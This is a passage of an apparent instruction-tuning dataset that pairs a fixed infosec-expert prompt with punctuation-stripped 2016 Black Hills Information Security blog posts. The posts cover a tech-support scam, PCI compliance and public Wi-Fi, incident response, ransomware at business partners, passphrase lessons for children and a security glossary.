        "output": "Heather Doerges My mom called the other day It started out Honestly your father Which isn't a strange way for her to start a conversation about my dad What did he do this time I asked It all started out rather honestly the poor guy belongs to a photo club He decided he'd go out and buy an expensive Canon color photo printer He just wanted to print his photos to share with the club It didn't even cross his mind that something bad could happen So he got his printer hooked it up and started working with his photos to get them printed Yet every time he printed a picture the size was never right SO he googled Canon Tech Support online He clicked on the first site that popped up and found the phone number for the tech help he was looking for But it wasn't Canon Oh yes sir we can help you It sounds like a problem with your computer Let us come in to your computer and help you Because no one was there to say Hey Are you crazy Don't let those guys into your computer He agreed and they were in just like that and so was the virus they planted To me that is one the scariest things other people in other places should NOT be able to move your mouse around access your computer or even pretend they work for Canon The thing is if you let them in they will come Sometimes it isn't as obvious as what my dad did A lot of people will say well Duh why would you ever just let someone in your computer Even if it is for technical support But have you ever just been looking something up online or connecting with friends on social media and clicked on the little ad that pops up It's the same thing we are all guilty It may not be as severe the skull and crossbones virus death mask won't appear on your computer screen but if you keep clicking on the unsolicited ads or pop up talking videos then your computer starts to run slower and slower and s l o...w...e...r Adware spyware malware exist An article from Purdue University states Many users inadvertently download spyware or adware when downloading other programs Many popular peer to peer applications and other software packages include adware or spyware packages Even seemingly innocuous programs such as special cursors can contain spyware In addition many websites and advertising banners set cookies on your system that track your web usage SO Why is that dangerous The article goes on to state Spyware and adware can gather information about you your browsing habits as well as other data Cookies set by websites can allow these applications to track which websites you visit this is especially dangerous as some cookies can contain user login and password information for the website which created it In addition spyware and adware can slow your system down hog system resources and use network bandwidth Some spyware and adware can even be malware and open your system to attack or cause system problems Then you got bugs"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>For the Record - My First Confession</title>\n<taxonomies>Fun & Games, baby faced john, family, infosec, john strand, memories, wedding</taxonomies>\n<creation_date>Mon, 14 Mar 2016 22:36:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melisa Wachs Many many years ago John laid on the bathroom floor during his wedding reception near tears and screaming This was not due to any amount of alcohol consumed or lethargy induced by jamming out to the Foo Fighters or as you may assume because of the setting food poisoning Nope the reason for his tile-cuddle agony was me Let me back up John is my boss yes but firstly he is my older brother John's football shoulder injury brought us together on several occasions when I was a young girl When he threw his shoulder out by reaching into the dryer I was the one who reset it back into place when mom and dad were gone It was always an intense moment a knowing nod a count of three a quick shove pop and scream and it was reset It was something he could never do alone and he especially needed me as we lived 40 miles from town His wedding reception Well all I wanted to do was cover the grooms face in makeup Harmless request really But he had to resist so I sent a hackle of kids after him into the bathroom and they were a bit too effective I felt terrible that day and still do today Even though I was there for him to lean on time and time again it doesn't take away the fact that I messed up and hurt my brother But we're family we're in this journey of life together We're bound together so we forgive and move on Hours Before the Incident Working at Black Hills Information Security and seeing some of our customers situations I realize that the parallel of family life often shadows the business world At times the struggles of needs versus wants or deliberate offenses versus unintentional mistakes are very apparent This is especially the case with Information Security It seems that the most needed resources for IT professionals is time Time to research time to install time to patch time to log and report time time time For those of you who work in IT departments you know you are constantly resetting the shoulder of your corporation Taking the time to help individuals may seem wasteful Everyone depends on you at some point and when they're panicking you've got them covered In a way you're the hidden backbone of the family The time spent with coworkers helping them through IT social engineering or software situations is never wasteful if spent helping to educate them as well You're in it together after all right Never once has anyone at BHIS talked down to me for asking questions Our penetration testers always have time to address the support staff with absolutely any question Gracious explanations on something simple like how to use PDF pen lead to an openness for other matters of greater importance like setting up two-factor authentication It's a relationship that is based upon trust I feel very vulnerable when I admit that I struggle with something I know is very basic for our testers How our testers respond to behind-the-scenes employees in turn affects how comfortable we are with potentially important situations Again it shadows a family If the relationship is strong it makes bringing up mistakes and seeking any needed remediation much easier"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Public Wi-Fi Insecurity - Part Deux, For Compliance Sakes</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, InfoSec 101, Jordan Drysdale</taxonomies>\n<creation_date>Wed, 16 Mar 2016 22:38:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale See Jordan's Part 1 of this post here PCI-DSS strolled into town with the latest compliance package of minutiae laden IT speak at the end of last year Business owners are now saddled with mapping understanding and creating policies and procedures for handling credit card data flow For the majority of these firms dedicated IT staff and IT security knowledge are non-existent So how you should be asking by now are PCI compliance and public Wi-Fi insecurity related to each other In most cases of small to medium business where IT is non-existent or is a one person operation AND you find public wireless offerings we can bet it's all connected together Let's bottom line this thing if your IT budget is in the low thousands to zero range you should not be providing public Wi-Fi Reason number one your company swipes credit cards some firm out there processes your payments and expects you to be PCI compliant The moment a wireless network is deployed at a business a big red flag goes up Sure it is possible with extensive RADIUS configuration certificate deployment and a couple hours of testing to do it right but guess what If you have no idea what I just said your Wi-Fi probably isn't secure Let's revisit IT budgets again who connected this shiny new wireless device to the network Did they connect it to the corporate network Do credit card data flows traverse the same network If no one has any clue and the network map doesn't reflect this new install hardware upgrades or additions and you forgot the change management policies and procedures documentation guess what You are not PCI compliant Let's clarify another critical item for getting PCI compliance right scope Reason number two you should avoid wireless altogether you are responsible as a credit card merchant for any and all loss traced back to theft on your network If an organization is lacking the basic tenets of network management like a network map responsible network use policies change management and web filtering your organization will be forced to ingest an auditor hired by the credit card company whose customers lost money I assure you in nearly every one of these cases the small to medium business is found liable Here is one more reason your organization probably should not be offering public Wi-Fi responsibility If a business provides the medium over which malfeasance occurs the business is responsible Back to budgets if your budget does not include web filtering whitelisting data loss prevention and active management you should not be providing public wireless Whether or not you understand these things they are part of the basics of IT and network security Now when your public Wi-Fi network is used by someone whose actions result in harm or injury and you did not implement content porn dark sites worse restrictions you are responsible In the event something bad did happen on your network and you turned in a cyber insurance claim you should expect an auditor Your cyber insurance provider is going to send someone out to review your policies and procedures and interview your staff If you do not have policies to cover the handling of credit cards and your staff is not trained on them you are liable If your credit card network is running on the same network as your corporate data you are probably liable This auditor will probably ask to see your credit card data map Oh yeah are you asking your customers to dip the chip or swipe their card If they aren't using chip and pin as of this writing you are liable To minimize the systems in scope you should order your credit card scanners to be installed on old school telephone lines Those telephone line based credit card machines should support chip and pin Your employees should be regularly reminded of their role in IT systems and security Review sample policies and procedures for handling sensitive data from the SANS Institute and create some for your own organization Vet your IT vendors ask people from your social circles who they trust in your area When installing or deploying new solutions ask what your network looks like after your vendor is done get a new network map Last get rid of your public Wi-Fi it could well cost your business way more than a Your-Guest Wi-Fi network is worth Links SANS ww.sans.org SANS Policies ww.sans.org security-resources policies How to Approach PCI ww.pcisecuritystandards.org documents Prioritized_Approach_for_PCI_DSS_v3-1.pdf"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Incidence Response</title>\n<taxonomies>InfoSec 101</taxonomies>\n<creation_date>Mon, 21 Mar 2016 17:46:12 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts According to the Identity Theft Resource Center there were 781 data breaches tracked in 2015 That is on average over 2 per day And that represents only the data breaches that were reported by legal requirements or that were reported by news media This is the second highest year on record since 2005 It isn't a matter of if you will get breached it is only a matter of when So what are you going to do about it You can try to prevent it as much as possible but what are you going to do when the inevitable happens and there is a breach Here is a quick outline of some of the things that should be done if and when the unfortunate event happens I will use as the basis of my outline the information from the SANS Incident Management Model Throughout this whole process you should remember to document everything that has happened and what you are doing In the case that something goes wrong in your process you will be able to see what you did and undo any mistakes If it all went well you will have some great information for when something else happens in the future Prepare Long before you have an incident you need to be preparing for it You need to have all of the policies and procedures in place prior to the problem even arising If you have an issue and you need to look through your employees computers do you have permission to do so When you find that there is a problem who is going to be in charge What are the steps you will take to proceed to get back to a normal working condition If you aren't a large enough organization to have your own IT department or just need some backup who are you going to call to help you through the process These along with many other questions need to be thought out before the incident occurs After you have prepared the next steps become much more manageable While it will still cause you problems to return to life as usual you will not be wondering what to do Preparation is the first and probably the most important step to take but it must be done prior to the incident Identify The first thing you should identify should be the person who is going to be handling your incidents You should have a system in place so you know who to contact and who will be in charge You also need to make sure that something really took place What systems are affected and who needs to be told Is it only an isolated incident or is it widespread and affects many systems Identification can be difficult Even if you have identified something has happened or is happening it is even more challenging to understand the type extent and magnitude of the problem It might be a good idea to have a company at the ready to aid in identification of incidents Containment Prior to an incident you need to have a plan in place that will help determine strategies of containment If your system has been breached you should know exactly what to do before you have identified the problem Are you going to shut down the system disconnect if from the network or just turn a certain function s off Obviously the severity of the issue will determine what processes you will take to contain the issue but determining beforehand will make those decisions much simpler and quicker During the containment phase you should gathering information and evidence The evidence should be used to help fix the issue but it also could be useful in the case of legal proceedings Again documentation during this phase is critical You should log all that you are doing Eradication After you have contained the incident the next step is to remove it This can sometimes be a tricky step in the process Sometimes it can be as easy as running an antivirus or spyware scanner or you may need to restore from a backup and patch your system to fix any known vulnerabilities If you do a restore make sure that the original is not infected as well As part of the preparation phase there are things you can do to make eradication much simpler If you take the time to have a standard configuration for your systems restoring will be easier than if each system has its own configuration The more standard your systems are the quicker the restore will be Recovery Recovery is putting everything back together Again standardizing systems will make this much easier What are you going to do to prevent this from happening again Is it going to be hardware changes software changes patches password rule changes Is it going to be building security Even after you are back up and running you need to work on prevention so this incident doesn't repeat itself Lessons Learned After you have put Humpty Dumpty back together again you need to sit down with your Incidence Response Team and talk about lessons learned With all of your copious notes and documentation you will have some great information to go through and talk about Maybe you need to go back and do some more preparation maybe you need to do more identification on who should be in charge You might need to revamp your containment procedures If you don't learn from what has happened you have wasted a great opportunity While it is never a comfortable situation to be compromised it is possible to make it easier on you and your organization Preparation before the incident can go a long way in getting back to normal And learning from not only the incident itself but how you respond to it will help you improve preparations and handle the next one when it comes Resources Mason Pokladnik Gold Paper 2007 ww.sans.org reading-room whitepapers incident incident-handling-process-small-medium-businesses-1791 ww.idtheftcenter.org ITRC-Surveys-Studies 2015databreaches.html vlpubs.nist.gov nistpubs SpecialPublications NIST.SP.800-61r2.pdf"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Risky Business</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, b2b, back ups, backing up, business partners, infosec, ransomware, risk du jour</taxonomies>\n<creation_date>Wed, 23 Mar 2016 20:58:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Perez At BHIS a few of our customers have come to us very recently with the risk du jour no not the Cash for Creds program Beau highlighted but the risk posed when they discover that a business partner or far flung subsidiary has been hit by some ransomware variant Side note Be sure to take a listen to our recent ransomware webcast To that end we came up with some quick and dirty recommendations Note that these recommendations also apply when you've got a partner that has suffered a breach or major infection Delineate all business processes possible interactions business to business links or automated workflows etc that touch your partner Isolate those processes and treat any data coming from that partner as potentially hostile or malicious Set up a dedicated phone or in-person meeting to review with your partner how they are specifically handling those business interaction points post-incident Treat all documents received from your partner within the timeframe of the Incident as hostile and investigate those systems that process those workflows for any signs of malware Enable an SMTP gateway rule specifically flagging email from their domain so it is obvious to the recipients I.e your employees and that automatically quarantines or if appropriate deletes the attachments Some email systems will allow you to pre-pend EXTERNAL or other such flag in the subject line so that employees can readily see internal vs external email Consider a rule which prepends your partner's name so folks are extra vigilant An example is below Use a segmented and dedicated jump server to initiate any host to host communications with that partner Request to be put in contact with any law enforcement personnel that your partner has contacted Report this incident to your local law enforcement contacts Leverage FBI and InfraGard contacts to provide you with current information on ransomware incidents in both your geographical area and in your particular industry Ask your partner if they have any anecdotal stories of partners also being infected Start refreshing and also testing your disaster recovery and business continuity plans Test your backups You ARE backing up Right Stay paranoid because now that folks have paid and it's gotten press coverage the wolves smell blood Yours in paranoia Mike"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Passphrases for Tiny People</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, internet safety for kids, passphrase, passphrase for kids, passphrase lessons for kids, password lessons for kids, passwords, passwords for kids, teaching children about passwords, teaching kids about passwords, teaching kids internet safety, tiny people</taxonomies>\n<creation_date>Fri, 25 Mar 2016 19:25:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Gail Menius Once upon a time in a land not too far away about two miles from where I'm sitting now I used to be an elementary school librarian The kids and I used to read books together...look for books in the library together We would even explore the internet together When they got to be about eight years old I would teach them how to make passwords for our learning management system I used to use the curriculum on CommonSenseMedia here is a lesson plan for k-2 ww.commonsensemedia.org educators lesson powerful-passwords-k-2 The scope and sequence for common sense media is great But I found that this particular password lesson had a family guidance sheet for creating passwords that is a little behind the times when it came to password guidance The guidance suggests eight characters with hard to remember passwords which include numbers and symbols Even 5th graders have a hard time finding and using symbols on a keyboard So when I followed the curriculum to the letter the kids had a super hard time coming up with and remembering their passwords and even worse they would tell each other their passwords So on password day I would do a different lesson one that helped them to create and remember their passwords Since I've been working at Black Hills Information Security I decided to publish my lesson plan with a few tweaks for my friends at Knollwood Elementary School and any other teacher who is interested in Common Sense Media or creating strong passwords for tiny people We don't want children getting in the habit of writing down their passwords and just handing them out willy nilly So I'm going to show you a way to get kids to come up with a password on their own Then we will call their parents grandma or whomever their password manager This way when they get a little older they will know that a password manager is where they go to get their passwords so they don't have to remember all of them Here is a two-day lesson I think you can do with a child or a group of children to help them come up with a passphrase Objective Recognize that short passwords are easy to crack Create a passphrase that keeps your information safe Mini-lesson 1 Prior Knowledge Make sure that the children have seen you log ito a site before and have said the word password or passphrase when you log in Have something that the kids will actually make a password for Here are a list of sites that can be used something you need to protect like a piggy bank ode.org learn ww.abcya.com ww.khanacademy.org ww.edmodo.com ww.starfall.com ww.khanacademy.org Materials Paper 3 and Markers or Promethean or Smartboard Connection Remember when I went to Learncode or whatever you use and put in a password to be able to play the games Teach Today we will make a Password Next time we meet we will make a passphrase Both are something that you type to let you into a website that protects your private information Show examples of passwords Active Engagement 1 Come up with toys that are fun to play with together and write them on the Promethean for them as they come up with ideas.Toys Car Truck iPad Barbie 2 Come up with numbers and write them on the board as well Numbers 10 11 12 13 3 Then have them a word and a number and put them together to make a password Show them an example of how to do it Then have them help you do one Passwords car10 barbie12 Close If I asked you to guess my password how would you do it Ask them to turn and talk with their neighbor how you would guess the password Show them how long it will take to crack owsecureismypassword.net Link to future Learning Next time we meet we will make something even harder to guess than a password It's called a passphrase Instead of having just a word and a number together it will be three or more words together Mini-lesson 2 Materials List of passwords you made last time Paper or notecards and pencil for students Smartboard or promethean for writing an example passphrase and writing a passphrase together Connection Remember how we made passwords that were easy to guess Today I will write a passphrase and give it to a password manager My mom Here are some examples whenigrowupiwanttobeadoctor mygrandmamakesthebestcake Blueracecarsarecool What do they have that is the same Have students turn and talk to their neighbor A passphrase is a password that is super hard to guess It's a group of words that make sense together so they're easier to remember Who thinks this would be harder to guess than the passwords we made last time Teach First I will pick a sentence that you would like to finish Sentence starters list on the promethean board I like to When I grow up I want to be My mom likes to My cat is funny when she My best friend is My favorite animal is a My favorite food is The best sport is Then I will write the sentence starter I like best It is write that down on the other paper so everyone can see Demonstrate writing a sentence When I grow up I want to be an astronaut Then when I am finished I will draw a picture on the back of the paper of me being an astronaut Active Engagement Now it's your turn PIck a sentence starter that you like and write it down When you are done turn your paper over and draw your picture If you need help spelling something you can raise your hand or ask your neighbor Go around and help them finish writing their sentence When everyone is done then you take your sentence and turn it into a passphrase by taking the spaces out Passphrase When I grow up I want to be an astronaut whenigrowupIwanttobeanastronaut Close Then as a wrap-up activity you can show them how long it takes a computer to crack a password Enter student passphrases into the website to show how long it would take to crack it owsecureismypassword.net Then tell them that you will be their password manager and collect their cards Make sure they have their names on them before you take them Link to future learning Next time we will practice typing passwords Resources ww.commonsensemedia.org educators lesson powerful-passwords-k-2 owsecureismypassword.net"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Information Security Glossary - v2</title>\n<taxonomies>InfoSec 101, glossary, industry terms, information security, infosec, terms</taxonomies>\n<creation_date>Mon, 28 Mar 2016 14:28:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Original by Bob Covello CISSP Modified with permission by BHIS Note This glossary was started to answer questions related to information security It will be updated as required This is not an original work and it should not be treated as such Most of the information herein has been gathered from many publicly available sources _________ Numerical entries 1337 see L33tSpeak 42 The number 42 is often referenced in hacker communities and in various technical publications It is intended as a humorous tribute to author Douglas Adams Here is a short description of its origin The number 42 is in The Hitchhiker's Guide to the Galaxy by Douglas Adams The Answer to the Ultimate Question of Life the Universe and Everything calculated by an enormous supercomputer named Deep Thought over a period of 7.5 million years Unfortunately no one knows what the question is Thus to calculate the Ultimate Question a special computer the size of a small planet was built from organic components and named Earth A Advanced Persistent Threat APT The APT acronym was first popularized in a 2013 Mandiant Corporation now FireEye report APT1 Exposing One of China's Cyber Espionage Units available at ntelreport.mandiant.com Mandiant_APT1_Report.pdf that outlined the habits of a group of government-sponsored hackers who targeted specific organizations with a specific goal The sophistication strategic direction and often damaging characteristics of these attacks were given the name Advanced Persistent Threat Adware Software that is provided for free but contains advertisements APT See Advanced Persistent Threat Authorization creep Authorization creep occurs when an employee changes job functions and retains unnecessary permissions that were required for the previous job responsibilities This may result in an employee with inappropriate access to data B Black Box Test Testing done with very little or no information regarding target makeup or internals or protections Blue Team Red team-blue team exercises take their name from their military antecedents The idea is simple One group of security pros--a red team--attacks something and an opposing group--the blue team--defends it Originally the exercises were used by the military to test force-readiness They have also been used to test physical security of sensitive sites like nuclear facilities and the Department of Energy's National Laboratories and Technology Centers Botnet Abbreviation of Robot Network This is a network of compromised computers administered by a person who controls the activity of the computers through a remote console C C C See Command and Control C2 See Command and Control CFAA See Computer Fraud and Abuse Act Clone Phishing A type of phishing attack whereby a legitimate and previously delivered email containing an attachment or link has had its content and recipient address es taken and used to create an almost identical or cloned email The attachment or link within the email is replaced with a malicious version and then sent from an email address spoofed to appear to come from the original sender It may claim to be a resend of the original or an updated version to the original This technique could be used to Pivot from a previously infected machine and gain a foothold on another machine by exploiting the social trust associated with the inferred connection due to both parties receiving the original email See also Phishing Spear Phishing Whaling and Watering Hole Attack Command and Control Command and control C C also known as C2 is traffic flowing from compromised devices and the controllers of the botnet Common Vulnerabilities and Exposures CVE A reference method for publicly known information security vulnerabilities and exposures The system is maintained by MITRE Corporation with funding from various government agencies CVE Identifiers also referred to by the community as CVE names CVE numbers CVE entries CVE-IDs and CVEs are unique common identifiers for publicly known cyber security vulnerabilities Web Site ve.mitre.org Common Vulnerability Scoring System CVSS An open industry standard for assessing the severity of computer system security vulnerabilities Under the custodianship of NIST it attempts to establish a measure of how much concern a vulnerability warrants compared to other vulnerabilities so remediation efforts can be prioritized The scores are based on a series of measurements called metrics based on expert assessment The scores range from 0 to 10 Vulnerabilities with a base score in the range 7.0-10.0 are High those in the range 4.0-6.9 as Medium and 0-3.9 as Low Web Site ww.first.org cvss Computer Fraud and Abuse Act CFAA Enacted by Congress in 1986 as an amendment to existing computer fraud law 18 U.S.C 1030 which had been included in the Comprehensive Crime Control Act of 1984 It was written to clarify and increase the scope of the previous version of 18 U.S.C 1030 In addition to clarifying a number of the provisions in the original section 1030 the CFAA also criminalized additional computer-related acts Provisions addressed the distribution of malicious code and denial of service attacks Congress also included in the CFAA a provision criminalizing trafficking in passwords and similar items The Act has been amended a number of times Cookie A small piece of data sent from a website and stored in a user's web browser while the user is browsing that website Every time the user loads the website the browser sends the cookie back to the server to notify the website of the user's previous activity Cookies were designed to be a reliable mechanism for websites to remember stateful information such as items in a shopping cart or to record the user's browsing activity Covert Channel A type of computer security attack that creates the capability to transfer informational objects between processes that are not supposed to be allowed to communicate by the computer security policy Cross-Site Scripting XSS The act of loading an attacked third-party web application from an unrelated attack site in a manner that executes a fragment of JavaScript prepared by the attacker in the security context of the targeted domain Crystal Box Test Elements of Grey box see below with available documentation or even source code Cross-Site Request Forgery CSRF or XSRF A type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts Unlike cross-site scripting XSS which exploits the trust a user has for a particular site CSRF exploits the trust that a site has in a user's browser Cross-Site Request Forgery is often achieved through cookie and session hijacking CVE See Common Vulnerabilities and Exposures CVSS See Common Vulnerability Scoring System D DAC In computer security Discretionary Access Control DAC is a type of access control in which a user has complete control over all the programs it owns and executes and also determines the permissions other users have to those files and programs Because DAC requires permissions to be assigned to those who need access DAC is commonly described as a need-to-know access model DDoS Attack See Distributed Denial of Service Attack Denial of Service Attack Any action whether intentional unintentional malicious or innocuous which results in a disruption or reduction in data services DFIR See Digital Forensics and Incident Response DGA See Domain Generating Algorithm Digital Forensics and Incident Response DFIR Digital forensics is the process of uncovering and interpreting electronic data for use in a court of law The goal of the process is to preserve any evidence in its most original form while performing a structured investigation by collecting identifying and validating the digital information for the purpose of reconstructing past events Incident response is the act of preparing for and reacting to an emergent event such as a natural disaster or an interruption of business operations Distributed Denial of Service Attack DDoS The use of multiple machines to create a traffic flow that slows or halts data services on a targeted network Domain Name System DNS The centralized resource for computer name to IP address resolution This is the system that translates a friendly name such as google.com into the IP address that computers use to locate the associated site Domain Generating Algorithm Domain Generating Algorithms are mathematical functions that automatically create ethereal domains with obscure names These rogue domains are primarily used for ransomware payments and are quickly closed to evade law enforcement DNS Amplification attack A Distributed Denial of Service attack whereby a group of computers a botnet issue DNS requests that appear to come from a single server the target of the attack The requests contain a spoofed IP source address so all the DNS replies are directed to that source address causing a flood of traffic which results in a Denial of Service at the targeted machine DoS Attack See Denial of Service Attack Dropper This is a program that installs Drops and infected program or other malicious code onto the target machine E Ethical Hacking Ethical hacking is the process of identifying potential threats to a company's security infrastructure and then trying to exploit it but with permission from the company An ethical hacker tries to bypass system security and find weak points that someone else might exploit The benefit to a company is that the ethical hacker is a mock criminal The goal is for the ethical hacker to find security holes before the real bad guys do An ethical hacker understands how to respect privacy what actions are legal and which are illegal and how to perform the job without actually compromising the security of a company's infrastructure Evil Twin See Rogue Access Point F Fuzzing Test A software testing technique often automated or semi-automated that involves providing invalid unexpected or random data to the inputs of a computer program G Grey box test Testing done wherein minimal information regarding the makeup internals protections and areas of concern are discussed H Hash A process that can be used to map digital data of arbitrary size to digital data of fixed size The values returned by a hash function are called hash values hash codes hash sums or simply hashes A hash function allows one to easily verify that some input data matches a stored hash value but makes it hard to construct any data that would hash to the same value or find any two unique data pieces that hash to the same value This principle is used by many password checking systems See also Pass the Hash Heartbleed vulnerability The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library This weakness allows stealing the information protected under normal conditions by the SSL TLS encryption used to secure the Internet SSL TLS provides communication security and privacy over the Internet for applications such as web email instant messaging IM and some virtual private networks VPNs More information may be found at eartbleed.com Host-based Intrusion Detection System HIDS Software installed on an endpoint that monitors anomalous activity aimed at that endpoint cf Network-based Intrusion Detection System Hunt Team Exercise A method used by penetration testers to examine if attackers are inside a target network The Pen Testers hunt for evidence of the presence of intruders I IDS See Host-based Intrusion Detection System HIDS and Network-based Intrusion Detection System IEC See International Electrotechnical Commission Incident Response Any activity aligned with preparing and reacting to a security incident Usually a methodical approach used to prepare respond record and preserve a security event The SANS Institute instructors use the acronym PICERL as a mnemonic device for the method Preparation Identification Containment Eradication Recovery Lessons-learned See also Incident Response Team Incident Response Team This team is generally composed of specific members designated before an incident occurs although under certain circumstances the team may be an ad hoc group of willing volunteers Incident response teams are common in corporations as well as in public service organizations Input Validation A method of ensuring that the individual characters provided through user input are consistent with the expected characters of one or more known primitive data types as defined in a programming language or data storage and retrieval mechanism International Electrotechnical Commission IEC A non-profit non-governmental international standards organization that prepares and publishes International Standards for all electrical electronic and related technologies collectively known as electrotechnology International Organization for Standardization ISO The world's largest developer of voluntary international standards It aims to facilitate world trade by providing common standards between nations Intellectual Property A legal term that refers to creations of the mind Examples of intellectual property include music literature and other artistic works discoveries and inventions and words phrases symbols and designs Under intellectual property laws owners of intellectual property are granted certain exclusive rights Some common types of intellectual property rights IPR are copyright patents and industrial design rights and the rights that protect trademarks trade dress and in some jurisdictions trade secrets Intellectual property rights are themselves a form of property called intangible property Internet Protocol Address A unique number assigned to every computer that communicates on the internet This IP address is used to recognize your particular computer out of the millions of other computers connected to the Internet IP Address See Internet Protocol Address IP See Intellectual Property or Internet Protocol Address ISO See International Organization for Standardization ISO IEC JTC1 A joint technical committee of the International Organization for Standardization ISO and the International Electrotechnical Commission IEC Its purpose is to develop maintain and promote standards in the fields of information technology IT and Information and Communications Technology ICT J Javascript A scripting language developed by Netscape and trademarked through Oracle Corporation that executes actions within a browser While Javascript can add enhancements to the browsing experience the automatic execution in a browser makes it the perfect vehicle for two very common exploits Cross-Site Scripting XSS and Cross-Site Request Forgery XSRF L Lateral Movement Network movement whereby the attackers systematically connect to devices on the network in order to get closer to the intended target L33tSpeak Leet or 1337 also known as eleet or leetspeak is an alternative alphabet for many languages that is used primarily on the Internet It uses various combinations of ASCII characters to replace Latinate letters For example leet spellings of the word leet include 1337 and l33t eleet may be spelled 31337 or 3l33t The term leet is derived from the word elite The leet alphabet is a specialized form of symbolic writing Leet may also be considered a substitution cipher although many dialects or linguistic varieties exist in different online communities The term leet is also used as an adjective to describe formidable prowess or accomplishment especially in the fields of online gaming and in its original usage computer hacking M Mac Abbreviation for Apple Macintosh computers and or the Apple Macintosh Operating System known as Mac OS MAC In computer security Mandatory Access Control MAC is a type of access control in which only the administrator manages the access controls The administrator defines the usage and access policy which cannot be modified or changed by users and the policy will indicate who has access to which programs and files MAC is most often used in systems where priority is placed on confidentiality MAC address A Media Access Control address MAC address is a 48-bit unique identifier assigned to network interfaces for communications on the physical network segment A typical MAC address follows the numbering convention F0-1F-AF-02-20-60 The first 3 number pairs identify the unique manufacturer identifier in this case Dell The following 3 number pairs are unique as no two network cards should share the same MAC address on the same network or communication problems will occur A list of MAC identifiers may be found at ww.adminsub.net mac-address-finder Magic Cookie A token or short packet of data passed between communicating programs where the data is typically not meaningful to the recipient program The contents are opaque meaning that the data structure is not clearly defined and not usually interpreted until the recipient passes the cookie data back to the sender or perhaps another program at a later time The cookie is often used like a ticket to identify a particular event or transaction Malware Software that is written with the intent of causing intentional harm to or data exfiltration from a system The word comes from a combination of the word Malicious and Software Cf Adware Spyware Man-In-The-Middle MitM An attack whereby a device is used as a pass-through to capture all traffic before it is sent to its intended destination A Man-in-the-Middle attack can be used to steal login credentials and other sensitive information that is transmitted over an unencrypted connection MitM See Man-in-the-Middle N National Institute of Standards and Technology NIST A measurement standards laboratory also known as a National Metrological Institute NMI which is a non-regulatory agency of the United States Department of Commerce The institute's official mission is to promote U.S innovation and industrial competitiveness by advancing measurement science standards and technology in ways that enhance economic security and improve our quality of life NIST documentation in the Computer Security arena is the infamous 800-xx series Prior to 1988 known as the National Bureau of Standards NBS Web site ww.nist.gov index.html Network-based Intrusion Detection System An appliance or application that monitors traffic across the entire network to alert against anomalous behavior cf Host-based Intrusion Detection System Nicknames In recent years new vulnerabilities have been given nicknames such as Heartbleed and POODLE This has not been generally well-received in some security circles as it minimizes the severity of the vulnerability without making the general public understand the gravity of the problem NIST See National Institute of Standards and Technology O Open Web Application Security Project OWASP The Open Web Application Security Project OWASP is an online community dedicated to web application security The OWASP community includes corporations educational organizations and individuals from around the world This community works to create freely-available articles methodologies documentation tools and technologies Web site ww.owasp.org index.php Main_Page OWASP See Open Web Application Security Project P Pass the Hash A technique that allows an attacker to authenticate to a remote server or service by using the underlying hash of a user's password instead of requiring the associated plaintext password as is normally the case Penetration Test A Penetration Test a.k.a Pen Test is an attack on a computer system with the intention of finding security weaknesses potentially gaining access to it 